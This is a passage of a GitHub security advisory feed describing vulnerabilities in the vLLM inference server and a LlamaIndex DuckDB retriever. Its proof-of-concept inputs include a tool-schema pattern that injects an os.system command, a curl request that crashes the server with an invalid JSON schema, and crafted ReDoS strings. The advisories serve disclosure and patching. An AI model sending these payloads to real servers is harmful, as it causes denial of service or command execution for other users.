  "messages": [
    {
      "role": "user",
      "content": "Crash via Pattern"
    }
  ],
  "tools": [
    {
      "type": "function",
      "function": {
        "name": "crash02",
        "parameters": {
          "type": "object",
          "properties": {
            "a": {
              "type": "string",
"pattern": "{{ <strong>import</strong>('os').system('echo RCE_OK &gt; /tmp/pwned') or 'SAFE' }}"
            }
          }
        }
      }
    }
  ],
  "tool_choice": {
    "type": "function",
    "function": {
      "name": "crash02"
    }
  },
  "stream": false,
  "max_tokens": 32,
  "temperature": 0.2,
  "top_p": 1,
  "n": 1
}</p>
<h3 id="impact">Impact</h3>
<p>Backend workers can be crashed causing anyone to using the inference engine to get 500 internal server errors on subsequent requests. </p>
<h3 id="fix">Fix</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65">https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48944">https://nvd.nist.gov/vuln/detail/CVE-2025-48944</a></li>
<li><a href="https://github.com/advisories/GHSA-vrq3-r879-7m65">https://github.com/advisories/GHSA-vrq3-r879-7m65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrq3-r879-7m65</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T19:42:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM allows clients to crash the openai server with invalid regex]]></title>
        <id>https://github.com/advisories/GHSA-9hcf-v7m4-6m2j</id>
        <link href="https://github.com/advisories/GHSA-9hcf-v7m4-6m2j"/>
        <updated>2025-05-30T21:40:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A denial of service bug caused the vLLM server to crash if an invalid regex was provided while using structured output. This vulnerability is similar to <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg">GHSA-6qc9-v4r8-22xg</a>, but for regex instead of a JSON schema.</p>
<p>Issue with more details: <a href="https://github.com/vllm-project/vllm/issues/17313">https://github.com/vllm-project/vllm/issues/17313</a></p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-9hcf-v7m4-6m2j">https://github.com/vllm-project/vllm/security/advisories/GHSA-9hcf-v7m4-6m2j</a></li>
<li><a href="https://github.com/vllm-project/vllm/issues/17313">https://github.com/vllm-project/vllm/issues/17313</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff">https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48943">https://nvd.nist.gov/vuln/detail/CVE-2025-48943</a></li>
<li><a href="https://github.com/advisories/GHSA-9hcf-v7m4-6m2j">https://github.com/advisories/GHSA-9hcf-v7m4-6m2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hcf-v7m4-6m2j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T19:42:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM DOS: Remotely kill vllm over http with invalid JSON schema]]></title>
        <id>https://github.com/advisories/GHSA-6qc9-v4r8-22xg</id>
        <link href="https://github.com/advisories/GHSA-6qc9-v4r8-22xg"/>
        <updated>2025-05-30T21:40:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Hitting the  /v1/completions API with a invalid json_schema as a Guided Param will kill the vllm server</p>
<h3 id="details">Details</h3>
<p>The following API call 
<code>(venv) [derekh@ip-172-31-15-108 ]$ curl -s http://localhost:8000/v1/completions -H "Content-Type: application/json" -d '{"model": "meta-llama/Llama-3.2-3B-Instruct","prompt": "Name two great reasons to visit Sligo ", "max_tokens": 10, "temperature": 0.5, "guided_json":"{\"properties\":{\"reason\":{\"type\": \"stsring\"}}}"}'    </code>
will provoke a Uncaught exceptions from xgrammer in 
<code>./lib64/python3.11/site-packages/xgrammar/compiler.py </code></p>
<p>Issue with more information: <a href="https://github.com/vllm-project/vllm/issues/17248">https://github.com/vllm-project/vllm/issues/17248</a></p>
<h3 id="poc">PoC</h3>
<p>Make a call to vllm with invalid json_scema e.g. <code>{\"properties\":{\"reason\":{\"type\": \"stsring\"}}}</code></p>
<p><code>curl -s http://localhost:8000/v1/completions -H "Content-Type: application/json" -d '{"model": "meta-llama/Llama-3.2-3B-Instruct","prompt": "Name two great reasons to visit Sligo ", "max_tokens": 10, "temperature": 0.5, "guided_json":"{\"properties\":{\"reason\":{\"type\": \"stsring\"}}}"}' </code></p>
<h3 id="impact">Impact</h3>
<p>vllm crashes</p>
<p>example traceback</p>
<pre><code>ERROR 03-26 17:25:01 [core.py:340] EngineCore hit an exception: Traceback (most recent call last):
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/engine/core.py", line 333, in run_engine_core
ERROR 03-26 17:25:01 [core.py:340]     engine_core.run_busy_loop()
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/engine/core.py", line 367, in run_busy_loop
ERROR 03-26 17:25:01 [core.py:340]     outputs = step_fn()
ERROR 03-26 17:25:01 [core.py:340]               ^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/engine/core.py", line 181, in step
ERROR 03-26 17:25:01 [core.py:340]     scheduler_output = self.scheduler.schedule()
ERROR 03-26 17:25:01 [core.py:340]                        ^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/core/scheduler.py", line 257, in schedule
ERROR 03-26 17:25:01 [core.py:340]     if structured_output_req and structured_output_req.grammar:
ERROR 03-26 17:25:01 [core.py:340]                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py", line 41, in grammar
ERROR 03-26 17:25:01 [core.py:340]     completed = self._check_grammar_completion()
ERROR 03-26 17:25:01 [core.py:340]                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py", line 29, in _check_grammar_completion
ERROR 03-26 17:25:01 [core.py:340]     self._grammar = self._grammar.result(timeout=0.0001)
ERROR 03-26 17:25:01 [core.py:340]                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/usr/lib64/python3.11/concurrent/futures/_base.py", line 456, in result
ERROR 03-26 17:25:01 [core.py:340]     return self.__get_result()
ERROR 03-26 17:25:01 [core.py:340]            ^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/usr/lib64/python3.11/concurrent/futures/_base.py", line 401, in __get_result
ERROR 03-26 17:25:01 [core.py:340]     raise self._exception
ERROR 03-26 17:25:01 [core.py:340]   File "/usr/lib64/python3.11/concurrent/futures/thread.py", line 58, in run
ERROR 03-26 17:25:01 [core.py:340]     result = self.fn(*self.args, **self.kwargs)
ERROR 03-26 17:25:01 [core.py:340]              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/vllm/v1/structured_output/__init__.py", line 120, in _async_create_grammar
ERROR 03-26 17:25:01 [core.py:340]     ctx = self.compiler.compile_json_schema(grammar_spec,
ERROR 03-26 17:25:01 [core.py:340]           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ERROR 03-26 17:25:01 [core.py:340]   File "/home/derekh/workarea/vllm/venv/lib64/python3.11/site-packages/xgrammar/compiler.py", line 101, in compile_json_schema
ERROR 03-26 17:25:01 [core.py:340]     self._handle.compile_json_schema(
ERROR 03-26 17:25:01 [core.py:340] RuntimeError: [17:25:01] /project/cpp/json_schema_converter.cc:795: Check failed: (schema.is&lt;picojson::object&gt;()) is false: Schema should be an object or bool
ERROR 03-26 17:25:01 [core.py:340] 
ERROR 03-26 17:25:01 [core.py:340] 
CRITICAL 03-26 17:25:01 [core_client.py:269] Got fatal signal from worker processes, shutting down. See stack trace above for root cause issue.
</code></pre>
<h3 id="fix">Fix</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg">https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg</a></li>
<li><a href="https://github.com/vllm-project/vllm/issues/17248">https://github.com/vllm-project/vllm/issues/17248</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/17623">https://github.com/vllm-project/vllm/pull/17623</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff">https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48942">https://nvd.nist.gov/vuln/detail/CVE-2025-48942</a></li>
<li><a href="https://github.com/advisories/GHSA-6qc9-v4r8-22xg">https://github.com/advisories/GHSA-6qc9-v4r8-22xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qc9-v4r8-22xg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T19:41:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM has a Weakness in MultiModalHasher Image Hashing Implementation]]></title>
        <id>https://github.com/advisories/GHSA-c65p-x677-fgj6</id>
        <link href="https://github.com/advisories/GHSA-c65p-x677-fgj6"/>
        <updated>2025-05-29T21:36:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the file <code>vllm/multimodal/hasher.py</code>, the <code>MultiModalHasher</code> class has a security and data integrity issue in its image hashing method. Currently, it serializes <code>PIL.Image.Image</code> objects using only <code>obj.tobytes()</code>, which returns only the raw pixel data, without including metadata such as the image’s shape (width, height, mode). As a result, two images of different sizes (e.g., 30x100 and 100x30) with the same pixel byte sequence could generate the same hash value. This may lead to hash collisions, incorrect cache hits, and even data leakage or security risks.</p>
<h2 id="details">Details</h2>
<ul>
<li><strong>Affected file:</strong> <code>vllm/multimodal/hasher.py</code></li>
<li><strong>Affected method:</strong> <code>MultiModalHasher.serialize_item</code>
<a href="https://github.com/vllm-project/vllm/blob/9420a1fc30af1a632bbc2c66eb8668f3af41f026/vllm/multimodal/hasher.py#L34-L35">https://github.com/vllm-project/vllm/blob/9420a1fc30af1a632bbc2c66eb8668f3af41f026/vllm/multimodal/hasher.py#L34-L35</a></li>
<li><strong>Current behavior:</strong> For <code>Image.Image</code> instances, only <code>obj.tobytes()</code> is used for hashing.</li>
<li><strong>Problem description:</strong> <code>obj.tobytes()</code> does not include the image’s width, height, or mode metadata.</li>
<li><strong>Impact:</strong> Two images with the same pixel byte sequence but different sizes could be regarded as the same image by the cache and hashing system, which may result in:<ul>
<li>Incorrect cache hits, leading to abnormal responses</li>
<li>Deliberate construction of images with different meanings but the same hash value</li>
</ul>
</li>
</ul>
<h2 id="recommendation">Recommendation</h2>
<p>In the <code>serialize_item</code> method, <strong>serialization of <code>Image.Image</code> objects should include not only pixel data, but also all critical metadata</strong>—such as dimensions (<code>size</code>), color mode (<code>mode</code>), format, and especially the <code>info</code> dictionary. The <code>info</code> dictionary is particularly important in palette-based images (e.g., mode <code>'P'</code>), where the palette itself is stored in <code>info</code>. Ignoring <code>info</code> can result in hash collisions between visually distinct images with the same pixel bytes but different palettes or metadata. This can lead to incorrect cache hits or even data leakage.</p>
<p><strong>Summary:</strong><br>Serializing only the raw pixel data is insecure. Always include all image metadata (<code>size</code>, <code>mode</code>, <code>format</code>, <code>info</code>) in the hash calculation to prevent collisions, especially in cases like palette-based images.</p>
<p><strong>Impact for other modalities</strong>
For the influence of other modalities, since the video modality is transformed into a multi-dimensional array containing the length, width, time, etc. of the video, the same problem exists due to the incorrect sequence of numpy as well.</p>
<p>For audio, since the momo function is not enabled in librosa.load, the loaded audio is automatically encoded into single channels by librosa and returns a one-dimensional array of numpy, thus keeping the structure of numpy fixed and not affected by this issue.</p>
<h2 id="fixes">Fixes</h2>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/17378">https://github.com/vllm-project/vllm/pull/17378</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-c65p-x677-fgj6">https://github.com/vllm-project/vllm/security/advisories/GHSA-c65p-x677-fgj6</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/17378">https://github.com/vllm-project/vllm/pull/17378</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/99404f53c72965b41558aceb1bc2380875f5d848">https://github.com/vllm-project/vllm/commit/99404f53c72965b41558aceb1bc2380875f5d848</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46722">https://nvd.nist.gov/vuln/detail/CVE-2025-46722</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-43.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-43.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-c65p-x677-fgj6">https://github.com/advisories/GHSA-c65p-x677-fgj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c65p-x677-fgj6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T18:03:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] Potential Timing Side-Channel Vulnerability in vLLM’s Chunk-Based Prefix Caching]]></title>
        <id>https://github.com/advisories/GHSA-4qjh-9fv9-r85r</id>
        <link href="https://github.com/advisories/GHSA-4qjh-9fv9-r85r"/>
        <updated>2025-05-29T21:27:57.000Z</updated>
        <content type="html"><![CDATA[<p>This issue arises from the prefix caching mechanism, which may expose the system to a timing side-channel attack.</p>
<h2 id="description">Description</h2>
<p>When a new prompt is processed, if the PageAttention mechanism finds a matching prefix chunk, the prefill process speeds up, which is reflected in the TTFT (Time to First Token). Our tests revealed that the timing differences caused by matching chunks are significant enough to be recognized and exploited.</p>
<p>For instance, if the victim has submitted a sensitive prompt or if a valuable system prompt has been cached, an attacker sharing the same backend could attempt to guess the victim's input. By measuring the TTFT based on prefix matches, the attacker could verify if their guess is correct, leading to potential leakage of private information.</p>
<p>Unlike token-by-token sharing mechanisms, vLLM’s chunk-based approach (PageAttention) processes tokens in larger units (chunks). In our tests, with chunk_size=2, the timing differences became noticeable enough to allow attackers to infer whether portions of their input match the victim's prompt at the chunk level.</p>
<h2 id="environment">Environment</h2>
<ul>
<li>GPU: NVIDIA A100 (40G)</li>
<li>CUDA: 11.8</li>
<li>PyTorch: 2.3.1</li>
<li>OS: Ubuntu 18.04</li>
<li>vLLM: v0.5.1
Configuration: We launched vLLM using the default settings and adjusted chunk_size=2 to evaluate the TTFT.</li>
</ul>
<h2 id="leakage">Leakage</h2>
<p>We conducted our tests using LLaMA2-70B-GPTQ on a single device. We analyzed the timing differences when prompts shared prefixes of 2 chunks, and plotted the corresponding ROC curves. Our results suggest that timing differences can be reliably used to distinguish prefix matches, demonstrating a potential side-channel vulnerability.
<img width="400" alt="roc_curves_combined_block_2" src="https://github.com/user-attachments/assets/db3491e9-02b7-424c-9b6d-56f553b39f2f"></p>
<h2 id="results">Results</h2>
<p>In our experiment, we analyzed the response time differences between cache hits and misses in vLLM's PageAttention mechanism. Using ROC curve analysis to assess the distinguishability of these timing differences, we observed the following results:</p>
<ul>
<li>With a 1-token prefix, the ROC curve yielded an AUC value of 0.571, indicating that even with a short prefix, an attacker can reasonably distinguish between cache hits and misses based on response times.</li>
<li>When the prefix length increases to 8 tokens, the AUC value rises significantly to 0.99, showing that the attacker can almost perfectly identify cache hits with a longer prefix.</li>
</ul>
<h2 id="fixes">Fixes</h2>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/17045">https://github.com/vllm-project/vllm/pull/17045</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-4qjh-9fv9-r85r">https://github.com/vllm-project/vllm/security/advisories/GHSA-4qjh-9fv9-r85r</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/17045">https://github.com/vllm-project/vllm/pull/17045</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/77073c77bc2006eb80ea6d5128f076f5e6c6f54f">https://github.com/vllm-project/vllm/commit/77073c77bc2006eb80ea6d5128f076f5e6c6f54f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46570">https://nvd.nist.gov/vuln/detail/CVE-2025-46570</a></li>
<li><a href="https://github.com/advisories/GHSA-4qjh-9fv9-r85r">https://github.com/advisories/GHSA-4qjh-9fv9-r85r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qjh-9fv9-r85r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T18:02:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM vulnerable to Regular Expression Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-j828-28rj-hfhp</id>
        <link href="https://github.com/advisories/GHSA-j828-28rj-hfhp"/>
        <updated>2025-05-28T19:57:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A recent review identified several regular expressions in the vllm codebase that are susceptible to Regular Expression Denial of Service (ReDoS) attacks. These patterns, if fed with crafted or malicious input, may cause severe performance degradation due to catastrophic backtracking.</p>
<h4 id="1-vllmlorautilspy-line-173">1. vllm/lora/utils.py <a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173">Line 173</a></h4>
<p><a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/lora/utils.py#L173</a>
<strong>Risk Description:</strong></p>
<ul>
<li>The regex <code>r"\((.*?)\)\$?$"</code> matches content inside parentheses. If input such as <code>((((a|)+)+)+)</code> is passed in, it can cause catastrophic backtracking, leading to a ReDoS vulnerability.</li>
<li>Using <code>.*?</code> (non-greedy match) inside group parentheses can be highly sensitive to input length and nesting complexity.</li>
</ul>
<p><strong>Remediation Suggestions:</strong></p>
<ul>
<li>Limit the input string length.</li>
<li>Use a non-recursive matching approach, or write a regex with stricter content constraints.</li>
<li>Consider using possessive quantifiers or atomic groups (not supported in Python yet), or split and process before regex matching.</li>
</ul>
<hr>
<h4 id="2-vllmentrypointsopenaitool_parsersphi4mini_tool_parserpy-line-52">2. vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py <a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52">Line 52</a></h4>
<p><a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/tool_parsers/phi4mini_tool_parser.py#L52</a></p>
<p><strong>Risk Description:</strong></p>
<ul>
<li>The regex <code>r'functools\[(.*?)\]'</code> uses <code>.*?</code> to match content inside brackets, together with <code>re.DOTALL</code>. If the input contains a large number of nested or crafted brackets, it can cause backtracking and ReDoS.</li>
</ul>
<p><strong>Remediation Suggestions:</strong></p>
<ul>
<li>Limit the length of <code>model_output</code>.</li>
<li>Use a stricter, non-greedy pattern (avoid matching across extraneous nesting).</li>
<li>Prefer <code>re.finditer()</code> and enforce a length constraint on each match.</li>
</ul>
<hr>
<h4 id="3-vllmentrypointsopenaiserving_chatpy-line-351">3. vllm/entrypoints/openai/serving_chat.py <a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351">Line 351</a></h4>
<p><a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/vllm/entrypoints/openai/serving_chat.py#L351</a></p>
<p><strong>Risk Description:</strong></p>
<ul>
<li>The regex <code>r'.*"parameters":\s*(.*)'</code> can trigger backtracking if <code>current_text</code> is very long and contains repeated structures.</li>
<li>Especially when processing strings from unknown sources, <code>.*</code> matching any content is high risk.</li>
</ul>
<p><strong>Remediation Suggestions:</strong></p>
<ul>
<li>Use a more specific pattern (e.g., via JSON parsing).</li>
<li>Impose limits on <code>current_text</code> length.</li>
<li>Avoid using <code>.*</code> to capture large blocks of text; prefer structured parsing when possible.</li>
</ul>
<hr>
<h4 id="4-benchmarksbenchmark_serving_structured_outputpy-line-650">4. benchmarks/benchmark_serving_structured_output.py <a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650">Line 650</a></h4>
<p><a href="https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650">https://github.com/vllm-project/vllm/blob/2858830c39da0ae153bc1328dbba7680f5fbebe1/benchmarks/benchmark_serving_structured_output.py#L650</a></p>
<p><strong>Risk Description:</strong></p>
<ul>
<li>The regex <code>r'\{.*\}'</code> is used to extract JSON inside curly braces. If the <code>actual</code> string is very long with unbalanced braces, it can cause backtracking, leading to a ReDoS vulnerability.</li>
<li>Although this is used for benchmark correctness checking, it should still handle abnormal inputs carefully.</li>
</ul>
<p><strong>Remediation Suggestions:</strong></p>
<ul>
<li>Limit the length of <code>actual</code>.</li>
<li>Prefer stepwise search for <code>{</code> and <code>}</code> or use a robust JSON extraction tool.</li>
<li>Recommend first locating the range with simple string search, then applying regex.</li>
</ul>
<h3 id="fix">Fix</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/18454">https://github.com/vllm-project/vllm/pull/18454</a></li>
</ul>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp">https://github.com/vllm-project/vllm/security/advisories/GHSA-j828-28rj-hfhp</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/18454">https://github.com/vllm-project/vllm/pull/18454</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601">https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601</a></li>
<li><a href="https://github.com/advisories/GHSA-j828-28rj-hfhp">https://github.com/advisories/GHSA-j828-28rj-hfhp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j828-28rj-hfhp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T17:50:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM has a Regular Expression Denial of Service (ReDoS, Exponential Complexity) Vulnerability in `pythonic_tool_parser.py`]]></title>
        <id>https://github.com/advisories/GHSA-w6q7-j642-7c25</id>
        <link href="https://github.com/advisories/GHSA-w6q7-j642-7c25"/>
        <updated>2025-05-30T21:40:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Regular Expression Denial of Service (ReDoS) vulnerability exists in the file <a href="https://github.com/vllm-project/vllm/blob/main/vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py"><code>vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py</code></a> of the vLLM project. The root cause is the use of a highly complex and nested regular expression for tool call detection, which can be exploited by an attacker to cause severe performance degradation or make the service unavailable.</p>
<h2 id="details">Details</h2>
<p>The following regular expression is used to match tool/function call patterns:</p>
<pre><code>r"\[([a-zA-Z]+\w*\(([a-zA-Z]+\w*=.*,\s*)*([a-zA-Z]+\w*=.*\s)?\),\s*)*([a-zA-Z]+\w*\(([a-zA-Z]+\w*=.*,\s*)*([a-zA-Z]+\w*=.*\s*)?\)\s*)+\]"
</code></pre>
<p>This pattern contains multiple nested quantifiers (<code>*</code>, <code>+</code>), optional groups, and inner repetitions which make it vulnerable to catastrophic backtracking.</p>
<p><strong>Attack Example:</strong>
A malicious input such as  </p>
<pre><code>[A(A=	)A(A=,		)A(A=,		)A(A=,		)... (repeated dozens of times) ...]

or

"[A(A=" + "\t)A(A=,\t" * repeat
</code></pre>
<p>can cause the regular expression engine to consume CPU exponentially with the input length, effectively freezing or crashing the server (DoS).</p>
<p><strong>Proof of Concept:</strong>
A Python script demonstrates that matching such a crafted string with the above regex results in exponential time complexity. Even moderate input lengths can bring the system to a halt.</p>
<pre><code>Length: 22, Time: 0.0000 seconds, Match: False
Length: 38, Time: 0.0010 seconds, Match: False
Length: 54, Time: 0.0250 seconds, Match: False
Length: 70, Time: 0.5185 seconds, Match: False
Length: 86, Time: 13.2703 seconds, Match: False
Length: 102, Time: 319.0717 seconds, Match: False
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Denial of Service (DoS):</strong> An attacker can trigger a denial of service by sending specially crafted payloads to any API or interface that invokes this regex, causing excessive CPU usage and making the vLLM service unavailable.</li>
<li><strong>Resource Exhaustion and Memory Retention:</strong> As this regex is invoked during function call parsing, the matching process may hold on to significant CPU and memory resources for extended periods (due to catastrophic backtracking). In the context of vLLM, this also means that the associated KV cache (used for model inference and typically stored in GPU memory) is not released in a timely manner. This can lead to GPU memory exhaustion, degraded throughput, and service instability.</li>
<li><strong>Potential for Broader System Instability:</strong> Resource exhaustion from stuck or slow requests may cascade into broader system instability or service downtime if not mitigated.</li>
</ul>
<h2 id="fix">Fix</h2>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/18454">https://github.com/vllm-project/vllm/pull/18454</a></li>
<li>Note that while this change has significantly improved performance, this regex may still be problematic. It has gone from exponential time complexity, O(2^N), to O(N^2).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-w6q7-j642-7c25">https://github.com/vllm-project/vllm/security/advisories/GHSA-w6q7-j642-7c25</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/18454">https://github.com/vllm-project/vllm/pull/18454</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601">https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48887">https://nvd.nist.gov/vuln/detail/CVE-2025-48887</a></li>
<li><a href="https://github.com/advisories/GHSA-w6q7-j642-7c25">https://github.com/advisories/GHSA-w6q7-j642-7c25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w6q7-j642-7c25</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T17:49:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llama-index-retrievers-duckdb-retriever]  LlamaIndex Retrievers Integration: DuckDBRetriever SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-339r-cjv9-x78g</id>
        <link href="https://github.com/advisories/GHSA-339r-cjv9-x78g"/>
        <updated>2025-05-28T16:09:37.000Z</updated>
        <content type="html"><![CDATA[<p>A SQL injection vulnerability exists in the <code>duckdb_retriever</code> component of the run-llama/llama_index repository, specifically in llama-index-retrievers-duckdb-retriever prior to v0.4.0. The vulnerability arises from the construction of SQL queries without using prepared statements, allowing an attacker to inject arbitrary SQL code. This can lead to remote code execution (RCE) by installing the shellfs extension and executing malicious commands.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11958">https://nvd.nist.gov/vuln/detail/CVE-2024-11958</a></li>
